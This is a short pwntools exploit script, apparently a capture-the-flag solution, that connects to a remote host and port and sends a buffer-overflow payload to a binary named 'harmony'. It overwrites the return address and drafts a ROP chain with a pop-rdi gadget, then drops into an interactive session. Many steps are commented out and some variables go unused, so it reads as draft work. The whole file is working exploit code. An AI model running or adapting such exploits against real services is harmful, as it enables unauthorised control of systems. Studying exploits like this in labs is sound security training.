from pwn import *

#p = process('./harmony')
p = remote('193.57.159.27',32023)

# pid = gdb.attach(p,gdbscript='''

# 	b * 0x0000000000401966
# 	b * 0x0000000000401602
# 	b * update_role
# 	b * menu
# 	b * set_role
# ''')




addr = 00401761

payload = 'a' * 32

payload +='\x3b\x15\x40'

# p.sendlineafter('> ','2')
# p.sendlineafter('name: ','B'*40)
pop_rdi_ret = p64(0x0000000000401b43)

# h = p64(0x404380)
h = p64(0x4015e2)
h += 'BBBBBBBB'
h += p64(0x4015e2)
h += p64(0x4015e2)
h += p64(0x4015e2)

f = 'a' * 11
f += pop_rdi_ret
f += p64(0x40436d)
f += p64(0x4015e3)


p.sendlineafter('> ','3')
p.sendlineafter('username: ',payload)
p.sendlineafter('> ','3')

# p.send(h)

# p.sendlineafter('name: ',f)
# p.sendlineafter('name: ',p64(0x404380))

# p.sendlineafter('> ','0')
# p.sendlineafter('> ','2')
# print p.recvline()
# print p.recvline()

p.interactive()



